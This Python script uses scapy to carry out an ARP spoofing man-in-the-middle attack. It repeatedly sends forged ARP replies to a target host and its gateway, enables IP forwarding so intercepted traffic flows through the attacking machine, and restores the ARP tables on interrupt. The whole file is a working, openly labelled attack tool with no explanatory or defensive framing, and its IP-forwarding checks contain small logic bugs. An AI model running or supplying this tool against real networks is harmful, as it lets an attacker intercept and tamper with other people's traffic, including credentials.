from scapy.all import ARP, Ether, srp, send
import argparse, time
from datetime import datetime
def enable_ip_route():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
        with open(file_path, "w") as f:
            print("[!] Enabling IP routing...")
            print(1, file=f)
            print("[+] IP routing enabled.\n")
def disable_ip_route():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 0:
            return
        with open(file_path, "w") as f:
            print("\n[!] Disabling IP routing...")
            print(0, file=f)
            print("[+] IP routing disabled.")
def get_mac(ip):
    ans, _ = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
def arp_spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {}: {} is at {}".format(target_ip, host_ip, self_mac))
def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {}: {} is at {}".format(target_ip, host_ip, self_mac))
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP address")
    parser.add_argument("-v", "--verbose", action="store_true", help="Default: True")
    args = parser.parse_args()
    target = args.target
    host = args.gateway
    verbose = args.verbose
    verbose=True
    print("\n" + "-"*45)
    print("Performing ARP Spoofing attack on: " + target)
    print("Time started: " + str(datetime.now()))
    print("-"*45 + "\n")
    enable_ip_route()
    try:
        while True:
            arp_spoof(target, host, verbose)
            arp_spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Restoring the network... Please wait.")
        restore(target, host)
        restore(host, target)
        disable_ip_route()